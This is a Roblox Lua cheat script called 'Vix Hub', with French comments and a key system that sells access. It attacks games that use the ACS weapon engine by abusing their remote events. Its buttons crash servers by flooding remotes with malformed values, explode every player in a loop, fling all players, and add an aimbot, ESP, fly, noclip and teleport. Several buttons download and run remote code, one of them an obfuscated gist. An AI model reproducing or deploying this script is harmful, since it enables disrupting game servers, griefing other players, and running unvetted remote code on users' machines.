local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

-- [< Variables >]

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

local clones = {}

-- Variables

local hauteur = 4
local largeur = 4

local espEnabled = false
local espData = {}

-- Créer le RemoteEvent dans Workspace si il n'existe pas déjà
local eventFolder = Workspace:FindFirstChild("Events")
if not eventFolder then
    eventFolder = Instance.new("Folder")
    eventFolder.Name = "Events"
    eventFolder.Parent = Workspace
end

local Remote = eventFolder:FindFirstChild("PlacePart")
if not Remote then
    Remote = Instance.new("RemoteEvent")
    Remote.Name = "PlacePart"
    Remote.Parent = eventFolder
end

local height = 5
local width = 5

local currentSpeed = 16 -- valeur de base
local speedLoopRunning = false

-- Fonction pour appliquer en boucle la vitesse
local function applySpeed(speed)
    currentSpeed = speed
    if speedLoopRunning then return end
    speedLoopRunning = true

    task.spawn(function()
        while speedLoopRunning do
            pcall(function()
                local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum and hum.WalkSpeed ~= currentSpeed then
                    hum.WalkSpeed = currentSpeed
                end
            end)
            task.wait(0.1)
        end
    end)
end

-- Quand le joueur respawn
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    applySpeed(currentSpeed)
end)

-- Fonction pour trouver le joueur le plus proche dans le FOV
local function getClosestPlayer()
    local closest = nil
    local shortestDistance = AimbotSettings.FOV or 100

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            if AimbotSettings.TeamCheck and player.Team == LocalPlayer.Team then
                continue
            end

            local part = player.Character:FindFirstChild("Head") or player.Character:FindFirstChild("HumanoidRootPart")
            if not part then continue end

            if AimbotSettings.WallCheck then
                local ray = Ray.new(workspace.CurrentCamera.CFrame.Position, (part.Position - workspace.CurrentCamera.CFrame.Position).Unit * 999)
                local hitPart = workspace:FindPartOnRay(ray, LocalPlayer.Character)
                if hitPart and not part:IsDescendantOf(hitPart) then
                    continue
                end
            end

            local screenPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(part.Position)
            if onScreen then
                local mouse = game:GetService("UserInputService"):GetMouseLocation()
                local distance = (Vector2.new(mouse.X, mouse.Y) - Vector2.new(screenPos.X, screenPos.Y)).Magnitude

                if distance < shortestDistance then
                    shortestDistance = distance
                    closest = part
                end
            end
        end
    end

    return closest
end

-- Aimbot loop
game:GetService("RunService").RenderStepped:Connect(function()
    if AimbotSettings.Enabled then
        local target = getClosestPlayer()
        if target then
            local camera = workspace.CurrentCamera
            camera.CFrame = CFrame.new(camera.CFrame.Position, target.Position)
        end
    end
end)

-- Variables pour gérer les drawings
local espEnabled = false
local drawings = {}

-- Fonction pour créer l'ESP pour un joueur
local function createESP(player)
    if player == LocalPlayer then return end

    local espData = {
        box = Drawing.new("Square"),
        name = Drawing.new("Text"),
        health = Drawing.new("Text")
    }

    for _, draw in pairs(espData) do
        draw.Visible = false
        draw.Color = Color3.fromRGB(255, 255, 255)
        draw.Center = true
        draw.Outline = true
        draw.Font = 2
    end

    espData.box.Thickness = 1
    espData.box.Transparency = 1
    espData.box.Filled = false

    drawings[player] = espData
end

-- Fonction pour supprimer l'ESP d’un joueur
local function removeESP(player)
    if drawings[player] then
        for _, draw in pairs(drawings[player]) do
            draw:Remove()
        end
        drawings[player] = nil
    end
end

local Window = Rayfield:CreateWindow({
   Name = "▶ Vix Hub ◀",
   Icon = 0, 
   LoadingTitle = "Loading...",
   LoadingSubtitle = "by VixHub",
   Theme = "Ocean",

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil,
      FileName = "Private"
   },

   Discord = {
      Enabled = true,
      Invite = "https://discord.gg/w92d9hnT2p",
      RememberJoins = true
   },

   KeySystem = true,
   KeySettings = {
      Title = "VixHub - SystemKey",
      Subtitle = "Key System",
      Note = "Achète ta key sur http://node.zenlihosting.eu:25569/",
      FileName = "Key",
      SaveKey = true,
      GrabKeyFromSite = false,
      Key = {"Hello"}
   }
})

local Tab = Window:CreateTab("ACS 1.7.5", "wrench") 

local Section = Tab:CreateSection("Whizz all")

Tab:CreateButton({
   Name = "Whizz all",
   Callback = function()
   while task.wait() do

   for _, player in next, game.Players:GetPlayers() do
       game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Whizz:FireServer(player)
   end
end
   end,
})


local Section = Tab:CreateSection("Crash server")


Tab:CreateButton({
   Name = "Crash Server V1",
   Callback = function()
    while task.wait() do

   for i = 1, 30 do
       game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.ServerBullet:FireServer(Vector3.new(0/0/0),Vector3.new(0/0/0))
   end
end
   end,
})

Tab:CreateButton({
   Name = "Crash Server V2",
   Callback = function()
game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:FireServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame={},Size={}})
   end,
})

local Section = Tab:CreateSection("Trigger breach")

local Size = {
   X = 10,
   Y = 10,
   Z = 10
}


Tab:CreateInput({
   Name = "Largeur (X)",
   PlaceholderText = "ex: 100",
   RemoveTextAfterFocusLost = true,
   Callback = function(text)
      Size.X = tonumber(text) or Size.X
   end,
})

Tab:CreateInput({
   Name = "Hauteur (Y)",
   PlaceholderText = "ex: 100",
   RemoveTextAfterFocusLost = true,
   Callback = function(text)
      Size.Y = tonumber(text) or Size.Y
   end,
})

Tab:CreateInput({
   Name = "Profondeur (Z)",
   PlaceholderText = "ex: 100",
   RemoveTextAfterFocusLost = true,
   Callback = function(text)
      Size.Z = tonumber(text) or Size.Z
   end,
})


Tab:CreateButton({
   Name = "Placer le bloc",
   Callback = function()
      local player = game.Players.LocalPlayer
      local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
      if not hrp then
         warn("HumanoidRootPart introuvable")
         return
      end
      
      local cFrame = CFrame.new(0,0,0) 

      game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:FireServer(
         3,
         {Fortified = {}, Destroyable = workspace},
         CFrame.new(),
         CFrame.new(),
         {
            CFrame = hrp.CFrame * cFrame,
            Size = Size
         }
      )
   end,
})

local Section = Tab:CreateSection("Armes ACS trouvÃ©es")

Tab:CreateButton({
   Name = "Give arme acs",
   Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
   end,
})

local Section = Tab:CreateSection("Explode all player")

Tab:CreateButton({
   Name = "Trigger explosion",
   Callback = function()
local player = game.Players.LocalPlayer
    local Evt = game.ReplicatedStorage.ACS_Engine.Eventos
    local Settings = {
        ["ExplosiveHit"] = true,
        ["ExPressure"] = math.huge,
        ["ExpRadius"] = 10,  
        ["DestroyJointRadiusPercent"] = 1,
        ["ExplosionDamage"] = 500, 
    }

    
    local function explodePlayer()
        for _, v in pairs(game.Players:GetChildren()) do
            if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                local hitPosition = v.Character.HumanoidRootPart.Position
                Evt.Hit:FireServer(hitPosition, v.Character.HumanoidRootPart, hitPosition, Enum.Material.Plastic, Settings)
            end
        end
    end

 
    while true do
        pcall(function()
            explodePlayer()
        end)
        wait(1)  
    end
end,
})

local Section = Tab:CreateSection("Click to boom")

Tab:CreateButton({
   Name = "Click to boom",
   Callback = function()
local function createExplosiveBulletACS(position, direction)
        
        local bullet = Instance.new("Part")
        bullet.Size = Vector3.new(1, 1, 1)
        bullet.Shape = Enum.PartType.Ball
        bullet.Position = position
        bullet.Anchored = false
        bullet.CanCollide = true
        bullet.Material = Enum.Material.SmoothPlastic
        bullet.Color = Color3.fromRGB(255, 0, 0)  -- Rouge
        bullet.Parent = workspace

       
        local velocity = Instance.new("BodyVelocity")
        velocity.MaxForce = Vector3.new(10000, 10000, 10000)
        velocity.Velocity = direction * 100  
        velocity.Parent = bullet

        
        bullet.Touched:Connect(function(hit)
            if hit then
                
                local Evt = game.ReplicatedStorage.ACS_Engine.Eventos
                local Settings = {
                    ["ExplosiveHit"] = true,
                    ["ExPressure"] = math.huge,
                    ["ExpRadius"] = 10,  
                    ["DestroyJointRadiusPercent"] = 1,
                    ["ExplosionDamage"] = 500,  
                }

                
                local hitPosition = hit.Parent:FindFirstChild("HumanoidRootPart") and hit.Parent.HumanoidRootPart.Position or hit.Position
                
                Evt.Hit:FireServer(hitPosition, hit, hitPosition, Enum.Material.Plastic, Settings)

               
                bullet:Destroy()
            end
        end)
    end

    
    local player = game.Players.LocalPlayer
    local mouse = player:GetMouse()

    
    mouse.Button1Down:Connect(function()
        
        local position = player.Character.HumanoidRootPart.Position
        local direction = (mouse.Hit.p - position).unit  
        createExplosiveBulletACS(position, direction)
    end)
end,
})

local Section = Tab:CreateSection("Explosif bullet")

Tab:CreateButton({
   Name = "Explosif bullet",
   Callback = function()
loadstring(game:HttpGet(('https://gist.githubusercontent.com/GattoHow/b85425bc886f6e0c11bc27191b51c112/raw/97cabe0ab4a3650e793028669fee5eb3d76f735e/ACS%20EDITOR%20OBFUSCADO'),true))()
   end,
})

local Tab = Window:CreateTab("ACS 2.0.1", "wrench")

local Section = Tab:CreateSection("Crash server")

Tab:CreateButton({
   Name = "Crash Server",
   Callback = function()
    while task.wait() do

  for _, player in next, game.Players:GetPlayers() do
     game:GetService("ReplicatedStorage")["ACS_Engine"].Events.Suppression:FireServer(player, 666, 666, 666)
  end
end
   end,
})

local Section = Tab:CreateSection("Whizz server")

Tab:CreateButton({
   Name = "Whizz all",
   Callback = function()
while task.wait() do

  for _, player in next, game.Players:GetPlayers() do
      game:GetService('ReplicatedStorage')['ACS_Engine'].Events.Whizz:FireServer(player)
        end
    end
end,
})

local Section = Tab:CreateSection("Bunnyhop")

Tab:CreateButton({
   Name = "Bunnyhop",
   Callback = function()
local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
cfg.AntiBunnyHop = false
end,
})

local Section = Tab:CreateSection("Inf stam")

Tab:CreateButton({
   Name = "Inf stam",
   Callback = function()
local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
cfg.EnableStamina = false
end,
})

local Tab = Window:CreateTab("INFO", 4483362458)

local Paragraph = Tab:CreateParagraph({Title = "ADEVERTISSEMENT", Content = "DONT LEAK THE SCRIPT ALL BY ME FOR YOU"})
-- [< Fling >]

local Tab = Window:CreateTab("Fling", "plane")

local Button = Tab:CreateButton({
   Name = "Fling all",
   Callback = function()
   game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Script Executed";
    Text = "Fling All";
    Duration = 6;
})
 
local Targets = {"All"} -- "All", "Target Name", "arian_was_here"
 
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
 
local AllBool = false
 
local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end
 
local Message = function(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end
 
local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart
 
    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle
 
    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end
 
    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit and not AllBool then
            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
 
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(90000000, 90000000 * 10, 90000000)
            RootPart.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
        end
 
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0
 
            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
 
        workspace.FallenPartsDestroyHeight = 0/0
 
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(900000000, 900000000, 900000000)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
 
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
 
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        else
            return Message("Error Occurred", "Target is missing everything", 5)
        end
 
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
 
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message("Error Ocurrido", "El Script A Fallado", 5)
    end
end
 
if not Welcome then Message("By Augus X", "", 6) end
getgenv().Welcome = true
if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
 
if AllBool then
    for _,x in next, Players:GetPlayers() do
        SkidFling(x)
    end
end
 
for _,x in next, Targets do
    if GetPlayer(x) and GetPlayer(x) ~= Player then
        if GetPlayer(x).UserId ~= 2924145477 then
            local TPlayer = GetPlayer(x)
            if TPlayer then
                SkidFling(TPlayer)
            end
        else
            Message("ERROR AL ASER FLING", "", 8)
        end
    elseif not GetPlayer(x) and not AllBool then
        Message("ERROR OCURRIDO", "NO SE LE ISO FLING", 8)
    end
end
   end,
})


-- [< Utility >]

local Utility = Window:CreateTab("Utility", "app-window") 

local Paragraph = Utility:CreateParagraph({Title = "AIMBOT DE SECOURS !", Content = "Attention ! Vous ne pouvez pas désactiver l'aimbot de secours."})

local Button = Utility:CreateButton({
   Name = "Aimbot De secours",
   Callback = function()
       local game, workspace = game, workspace
       local getrawmetatable, getmetatable, setmetatable, pcall, getgenv, next, tick = getrawmetatable, getmetatable, setmetatable, pcall, getgenv, next, tick
       local Vector2new, Vector3zero, CFramenew, Color3fromRGB, Color3fromHSV, Drawingnew, TweenInfonew = Vector2.new, Vector3.zero, CFrame.new, Color3.fromRGB, Color3.fromHSV, Drawing.new, TweenInfo.new
       local getupvalue, mousemoverel, tablefind, tableremove, stringlower, stringsub, mathclamp = debug.getupvalue, mousemoverel or (Input and Input.MouseMove), table.find, table.remove, string.lower, string.sub, math.clamp
       
       --// Checking for multiple processes

       if ExunysDeveloperAimbot and ExunysDeveloperAimbot.Exit then
       	ExunysDeveloperAimbot:Exit()
       end

       --// Environment

       getgenv().ExunysDeveloperAimbot = {
       	DeveloperSettings = {
       		UpdateMode = "RenderStepped",
       		TeamCheckOption = "TeamColor",
       		RainbowSpeed = 1 -- Bigger = Slower
       	},

       	Settings = {
       		Enabled = true,
       		TeamCheck = false,
       		AliveCheck = true,
       		WallCheck = false,
       		OffsetToMoveDirection = false,
       		OffsetIncrement = 15,
       		Sensitivity = 0,
       		Sensitivity2 = 3.5,
       		LockMode = 1,
       		LockPart = "Head",
       		TriggerKey = Enum.UserInputType.MouseButton2,
       		Toggle = false
       	},
       	FOVSettings = {
       		Enabled = true,
       		Visible = true,
       		Radius = 90,
       		NumSides = 60,
       		Thickness = 1,
       		Transparency = 1,
       		Filled = false,
       		RainbowColor = false,
       		RainbowOutlineColor = false,
       		Color = Color3fromRGB(255, 255, 255),
       		OutlineColor = Color3fromRGB(0, 0, 0),
       		LockedColor = Color3fromRGB(255, 150, 150)
       	},
       	Blacklisted = {},
       	FOVCircleOutline = Drawingnew("Circle"),
       	FOVCircle = Drawingnew("Circle")
       }

       local Environment = getgenv().ExunysDeveloperAimbot

       --// Functions

       function Environment.Exit(self)
       	for Index, _ in next, ServiceConnections do
       		Disconnect(ServiceConnections[Index])
       	end
       	self.FOVCircle:Remove()
       	self.FOVCircleOutline:Remove()
       	getgenv().ExunysDeveloperAimbot = nil
       end

       function Environment.Restart()
       	for Index, _ in next, ServiceConnections do
       		Disconnect(ServiceConnections[Index])
       	end
       	Load()
       end

       function Environment.GetClosestPlayer()
       	GetClosestPlayer()
       	local Value = Environment.Locked
       	CancelLock()
       	return Value
       end

       Environment.Load = Load
       setmetatable(Environment, {__call = Load})

       return Environment
   end,
})

local Button = Utility:CreateButton({
   Name = "Infinite Yield",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
   end,
})

local Button2 = Utility:CreateButton({
   Name = "Dex",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
   end,
})

local BypassButton = Utility:CreateButton({
   Name = "Bypass VC",
   Callback = function()
      game:GetService("VoiceChatService"):joinVoice()
      Rayfield:Notify({
         Title = "Bypass VC",
         Content = "Voice Chat activé avec succès.",
         Duration = 5,
      })
   end
})


Utility:CreateInput({
   Name = "🔮 Set Camera FOV",
   CurrentValue = tostring(workspace.CurrentCamera.FieldOfView),
   PlaceholderText = "ex: 90",
   RemoveTextAfterFocusLost = true,
   Callback = function(Text)
      local value = tonumber(Text)
      if value then
         -- Appliquer le FOV à la caméra
         workspace.CurrentCamera.FieldOfView = value
         
         -- Notification pour confirmation
         Rayfield:Notify({
            Title = "✅ FOV mis à jour",
            Content = "Le FOV de la caméra est maintenant à " .. value,
            Duration = 4,
            Image = "bell",
         })
      else
         -- Notification pour erreur si la valeur n'est pas valide
         Rayfield:Notify({
            Title = "❌ Erreur",
            Content = "Entre une valeur numérique valide (ex: 90)",
            Duration = 4,
            Image = "bell",
         })
      end
   end,
})

Utility:CreateButton({
   Name = "🔄 Reset FOV",
   Callback = function()
      -- Réinitialiser le FOV à la valeur par défaut (70)
      workspace.CurrentCamera.FieldOfView = 70
      
      -- Notification pour confirmer que le FOV a été réinitialisé
      Rayfield:Notify({
         Title = "✅ FOV réinitialisé",
         Content = "Le FOV de la caméra a été réinitialisé à 70.",
         Duration = 4,
         Image = "bell",
      })
   end,
})

-- Input avec notifs Rayfield
Utility:CreateInput({
   Name = "🏃‍♂️ Set WalkSpeed",
   CurrentValue = tostring(currentSpeed),
   PlaceholderText = "Default : 16",
   RemoveTextAfterFocusLost = true,
   Callback = function(Text)
      local speed = tonumber(Text)
      if speed then
         applySpeed(speed)
         Rayfield:Notify({
            Title = "✅ Vitesse changée",
            Content = "Tu marches maintenant à " .. speed .. " de speed.",
            Duration = 5,
            Image = "bell",
         })
      else
         Rayfield:Notify({
            Title = "❌ Erreur",
            Content = "Merci d'entrer un nombre valide (ex: 30)",
            Duration = 5,
            Image = "bell",
         })
      end
   end,
})

-- Création du toggle
local Toggle = Utility:CreateToggle({
   Name = "Afficher ESP (Pseudos + Boîte)",
   CurrentValue = false,
   Flag = "ESP_Toggle",
   Callback = function(Value)
      espEnabled = Value

      -- Fonction pour créer l'ESP
      local function createESP(player)
         if player == Players.LocalPlayer then return end
         if not player.Character then return end
         local character = player.Character
         local head = character:FindFirstChild("Head")
         local root = character:FindFirstChild("HumanoidRootPart")

         if not head or not root then return end
         if espData[player] then return end

         -- Pseudo au-dessus de la tête
         local billboard = Instance.new("BillboardGui")
         billboard.Name = "ESP_Name"
         billboard.Adornee = head
         billboard.Size = UDim2.new(0, 200, 0, 50)
         billboard.StudsOffset = Vector3.new(0, 2, 0)
         billboard.AlwaysOnTop = true
         billboard.Parent = game.CoreGui

         local nameLabel = Instance.new("TextLabel")
         nameLabel.Size = UDim2.new(1, 0, 1, 0)
         nameLabel.BackgroundTransparency = 1
         nameLabel.Text = player.Name
         nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
         nameLabel.TextStrokeTransparency = 0.5
         nameLabel.TextScaled = true
         nameLabel.Font = Enum.Font.SourceSansBold
         nameLabel.Parent = billboard

         -- SelectionBox (contour du joueur)
         local box = Instance.new("SelectionBox")
         box.Name = "ESP_Box"
         box.Adornee = character
         box.LineThickness = 0.05
         box.Color3 = Color3.fromRGB(255, 255, 255)
         box.SurfaceTransparency = 1
         box.Parent = game.CoreGui

         -- Stockage
         espData[player] = {billboard = billboard, box = box}
      end

      -- Fonction pour retirer l'ESP
      local function removeESP(player)
         local esp = espData[player]
         if esp then
            if esp.billboard then
               esp.billboard:Destroy()
            end
            if esp.box then
               esp.box:Destroy()
            end
            espData[player] = nil
         end
      end

      -- Si activé, ajoute ESP à tous
      if espEnabled then
         for _, player in pairs(Players:GetPlayers()) do
            createESP(player)
         end
      else
         for player, _ in pairs(espData) do
            removeESP(player)
         end
      end

      -- Connexions aux nouveaux joueurs
      Players.PlayerAdded:Connect(function(player)
         player.CharacterAdded:Connect(function()
            if espEnabled then
               task.wait(1)
               createESP(player)
            end
         end)
      end)

      -- Nettoyage quand un joueur quitte
      Players.PlayerRemoving:Connect(function(player)
         removeESP(player)
      end)
   end,
})

-- Fonction de téléportation vers un joueur
local InputTP = Utility:CreateInput({
    Name = "TP vers joueur",
    CurrentValue = "",
    PlaceholderText = "Entrez 3 lettres du pseudo",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        -- Vérifie si le texte est une chaîne valide et a au moins 3 lettres
        if typeof(text) ~= "string" or #text < 3 then
            return
        end

        -- Cherche un joueur dont le nom commence par les 3 lettres
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Name:lower():sub(1, 3) == text:lower():sub(1, 3) then
                local targetChar = player.Character or player.CharacterAdded:Wait()
                local targetHRP = targetChar:WaitForChild("HumanoidRootPart", 5)
                local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

                if targetHRP and myHRP then
                    myHRP.CFrame = targetHRP.CFrame + Vector3.new(3, 0, 0)

                    Rayfield:Notify({
                        Title = "TP Réussi",
                        Content = "Tu as été téléporté vers : " .. player.Name,
                        Duration = 4,
                        Image = "bell",
                    })
                else
                    Rayfield:Notify({
                        Title = "Erreur",
                        Content = "Impossible de téléporter (HRP manquant)",
                        Duration = 4,
                        Image = "bell",
                    })
                end
                break
            end
        end
    end
})

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

local flying = false
local flySpeed = 50 -- Speed at which the player flies

local function startFlying()
    flying = true
    
    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.MaxForce = Vector3.new(1000000, 1000000, 1000000)
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.Parent = rootPart

    local userInputService = game:GetService("UserInputService")

    while flying do
        local moveDirection = Vector3.new(0, 0, 0)
        
        if userInputService:IsKeyDown(Enum.KeyCode.W) then
            moveDirection = moveDirection + workspace.CurrentCamera.CFrame.LookVector
        end
        if userInputService:IsKeyDown(Enum.KeyCode.S) then
            moveDirection = moveDirection - workspace.CurrentCamera.CFrame.LookVector
        end
        if userInputService:IsKeyDown(Enum.KeyCode.A) then
            moveDirection = moveDirection - workspace.CurrentCamera.CFrame.RightVector
        end
        if userInputService:IsKeyDown(Enum.KeyCode.D) then
            moveDirection = moveDirection + workspace.CurrentCamera.CFrame.RightVector
        end
        if userInputService:IsKeyDown(Enum.KeyCode.Space) then
            moveDirection = moveDirection + Vector3.new(0, 1, 0)
        end
        if userInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
            moveDirection = moveDirection - Vector3.new(0, 1, 0)
        end
        
        bodyVelocity.Velocity = moveDirection * flySpeed
        wait(0.1)
    end
end

local function stopFlying()
    flying = false
    rootPart:FindFirstChild("BodyVelocity"):Destroy()
end

-- Toggle fly on and off with the "F" key
game:GetService("UserInputService").InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.N then
        if flying then
            stopFlying()
        else
            startFlying()
        end
    end
end)

-- Ajout du bouton Fly dans l'onglet Utility
local flyButton = Utility:CreateButton({
    Name = "Toggle Fly (N)",
    Callback = function()
        if flying then
            stopFlying()
        else
            startFlying()
        end
    end
})

local Paragraph = Utility:CreateParagraph({Title = "Pour le noclip", Content = "Attention ! Il faut a chaque fois cliquer sur le bouton pour noclip."})

local Button = Utility:CreateButton({
   Name = "Toggle Noclip",  -- Nom du bouton
   Callback = function()
       local noclip = false  -- Variable pour savoir si le noclip est activé ou non
       local previousCollisions = {}  -- Table pour garder une trace des états de collision

       local player = game.Players.LocalPlayer
       local character = player.Character or player.CharacterAdded:Wait()

       -- Fonction pour activer le noclip
       local function enableNoclip()
           noclip = true
           -- Désactiver les collisions pour chaque partie du personnage et garder une trace
           for _, part in pairs(character:GetDescendants()) do
               if part:IsA("BasePart") and part.CanCollide then
                   previousCollisions[part] = true  -- Garder la trace de l'état de collision
                   part.CanCollide = false
               end
           end
       end

       -- Fonction pour désactiver le noclip et revenir à l'état initial
       local function disableNoclip()
           noclip = false
           -- Réactiver les collisions pour chaque partie du personnage en utilisant les données précédentes
           for part, wasColliding in pairs(previousCollisions) do
               if part:IsA("BasePart") then
